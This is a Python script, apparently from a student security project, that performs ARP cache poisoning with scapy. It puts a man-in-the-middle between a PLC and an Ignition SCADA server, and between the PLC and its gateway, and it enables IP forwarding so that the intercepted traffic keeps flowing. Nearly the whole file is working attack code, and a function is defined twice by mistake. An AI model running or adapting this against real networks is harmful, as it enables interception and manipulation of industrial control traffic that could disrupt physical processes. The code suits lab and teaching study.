#!/usr/bin/env python3
"""
file:       arp_spoof.py
author:     Chris Tremblay <cst1465@rit.edu>
languate:   Python3
date:       2/13/2023, National Clean Out Your Computer Day
description:
    a suite to arp poison a switch to redirect traffic to this host
    check https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
    for code
"""

import scapy.all as scapy
import time
import color_prefixes as cp
import signal
import traceback
import final_exploit as fe
import sys
import subprocess

# constants
PLC     = "192.168.1.34"
GATEWAY = "192.168.1.1"
PLC_MAC = None
IGNITION_MAC = None
VERBOSE = False

def enable_ip_forwarding() -> bool:
    """
    description:
        attempts to enable kernel IP forwarding.
        this may be required to forward packets in 
        funky way way. Like this program
    returns:
        true -> if successful
        false -> otherwise
    """
    try:
        ret = subprocess.call( "./enable_ip_forward.sh", shell=True)
        print( type(ret), ret )
        sys.stdout.flush()

        if( ret != 0 ):
            return False
    except Exception as e:
        print( cp.RED_PREFIX + "ip forwarding error: " + str(e) + cp.RED_SUFFIX )
        return False
    return True

def enable_ip_forwarding() -> bool:
    """
    description:
        retores back to the correct thing
    returns:
        true -> if successful
        false -> otherwise
    """
    ret = subprocess.call( "echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
    return

def get_mac( ip: str ) -> str:
    """
    description:
        get the MAC address for a given ip
    parameter:
        ip -> the ip address we want to get the mac address of
    return:
        the MAC address in string format, None otherwise
    """
    # create arp request with dst ip
    arp_req = scapy.ARP( pdst=ip )
    bcast = scapy.Ether( dst="ff:ff:ff:ff:ff:ff" )
    arp_req_bcast = bcast / arp_req
    answer = scapy.srp( arp_req_bcast, iface="enp0s20f0u1", timeout=5, verbose=VERBOSE )[0]
    try:
        print( answer[0][1].hwsrc )
        return answer[0][1].hwsrc 
    except IndexError as e: 
        print( cp.RED_PREFIX + str(e) + cp.RED_SUFFIX )
        return None
    return None

def spoof( target_ip: str, spoof_ip: str ):
    """
    description:
        craft an arp packet and send it to spoof the 
    parameters:
        target_ip -> the 
    """
    dst = get_mac(target_ip)
    if( dst is None ):
        print( cp.RED_PREFIX + "Dest MAC doesn't exist" + cp.RED_SUFFIX )
        return
    packet = scapy.ARP( op=2, \
                        pdst=target_ip, \
                        hwdst=dst, \
                        psrc = spoof_ip )
    scapy.sendp( packet, verbose=VERBOSE, iface="enp0s20f0u1" )
    return

def restore( dst_ip: str, src_ip:str ):
    """
    description:
        restore back to defaults
    parameters:
        dst_ip -> the ip to go in dst field of ARP packet
        src_ip -> the ip to go in src field of ARP packet
    """
    # get mac addresses
    dst_mac = get_mac( dst_ip )
    src_mac = get_mac( src_ip )
    if( dst_mac is None ):
        print( cp.RED_PREFIX + "Dest MAC doesn't exist" + cp.RED_SUFFIX )
        return
    if( src_mac is None ):
        print( cp.RED_PREFIX + "Src MAC doesn't exist" + cp.RED_SUFFIX )
        return
    # craft packet    
    packet = scapy.ARP( op=2, \
                pdst=dst_ip, hwdst=dst_mac, \
                psrc=src_ip, hwsrc=src_mac )
    # send
    scapy.send( packet, verbose=VERBOSE )

def sig_term_handler( sig, frame ):
    """
    description:
        SIG_TERM hanlder. Walks up stack frame to find local variables
        of arp_poison function so that it can restore communication back 
        to the devices
    parameters:
        sig -> the signal to be processed
        frame -> the current stack frame
    """
    if( sig == signal.SIGTERM ):
        for f in traceback.walk_stack( frame ):
            name = f[0].f_code.co_name 
            local_vars = f[0].f_locals
            if( name == 'arp_poison'):
                print( cp.YELLOW_PREFIX + "Restoring ARP Caches, this may take a second..." + cp.YELLOW_SUFFIX )
                sys.stdout.flush()
                #restore( local_vars['target_ip'], local_vars['spoof_ip'] )
                #restore( local_vars['spoof_ip'], local_vars['target_ip'] )
                print( cp.YELLOW_PREFIX + "ARP Caches Restored" + cp.YELLOW_SUFFIX)
                sys.stdout.flush()
                exit()
    return

def arp_poison( plc_hostname: str, ignition_hostname: str ):
    """
    description:
        arp poison a target
    parameters:
        plc_hostname -> the hostname of the PLC
        ignition_hostname -> the hostname of the ignition server
    """
    # administrative stuff
    signal.signal( signal.SIGTERM, sig_term_handler )
    succeeded = enable_ip_forwarding()
    if( not succeeded ):
        print( cp.RED_PREFIX + "Could not enable IP Forwarding" + cp.RED_SUFFIX )

    # start spoofing
    my_ip = scapy.get_if_addr( "enp0s20f0u1" )
    my_mac = scapy.get_if_hwaddr( "enp0s20f0u1" )
    plc_mac = get_mac( plc_hostname )
    ignition_mac = get_mac( ignition_hostname )

    while( True ):
        try:
            #spoof( plc_hostname, my_ip )
            #spoof( my_ip, plc_hostname )

            # fool PLC that Ignition is this machine
            packet1 = scapy.ARP( op=2, \
                pdst=plc_hostname, hwdst=plc_mac, \
                psrc=ignition_hostname, hwsrc=my_mac )

            # fool Ignitino that PLC is this machine
            packet2 = scapy.ARP( op=2, \
                pdst=ignition_hostname, hwdst=ignition_mac, \
                psrc=plc_hostname, hwsrc=my_mac )

            scapy.sendp( scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/packet1, iface="enp0s20f0u1" )
            scapy.sendp( scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/packet2, iface="enp0s20f0u1" )
            time.sleep( 1 )
        except Exception as e:
            traceback.print_exc()
            print( cp.RED_PREFIX + "error " + str(e) + cp.RED_SUFFIX )
    return

def main():
    """
    description:
        the driver function
    """
    # start spoofing
    while( True ):
        try:
            spoof( PLC, GATEWAY )
            spoof( GATEWAY, PLC )
            time.sleep( 1 )
        except KeyboardInterrupt:
            print( "done" )
            restore( PLC, GATEWAY )
            restore( GATEWAY, PLC )
    return

if( __name__ == "__main__" ):
    main()
